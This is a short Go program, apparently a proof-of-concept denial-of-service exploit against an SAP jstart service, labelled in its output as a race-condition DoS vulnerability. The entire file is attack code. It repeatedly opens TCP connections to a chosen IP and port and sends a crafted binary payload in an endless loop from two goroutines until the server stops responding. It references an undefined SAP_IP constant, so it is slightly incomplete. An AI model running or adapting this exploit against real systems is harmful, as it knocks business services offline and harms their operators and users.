package main

import (
	"net"
	"fmt"
	_ "encoding/hex"
	"sync"
	"flag"
)

//Globals
var wg sync.WaitGroup

func dos (constr string) {
    defer wg.Done()
    var data  = "\x00\x00\x00\x1cNI_RTERR\x00y\x04\x00\x00ASD\x00\x00\x00\x04DAAAAAAA"
    //resp := make([]byte, 1024)
    for {
        conn, err := net.Dial("tcp", constr)
	if err != nil {
	    fmt.Print("Server is not responding... \n")
	    return
	}

        fmt.Fprintf(conn,data)
	//conn.Read(resp)
    }
}

func main () {
    var port = flag.String("port", "0", "jstart tcp port")
    var ip = flag.String("ip", SAP_IP, "ip")
    flag.Parse()

    constr := fmt.Sprintf("%s:%s",*ip,*port)


    for i := 0; i < 2; i++ {
        go dos(constr)
	wg.Add(1)
    }

    fmt.Println("Whaiting ...")
    fmt.Println("jstart - DoS Vuln(race condition) - port 64*** ... ")
    wg.Wait()
    fmt.Println("Done")

}
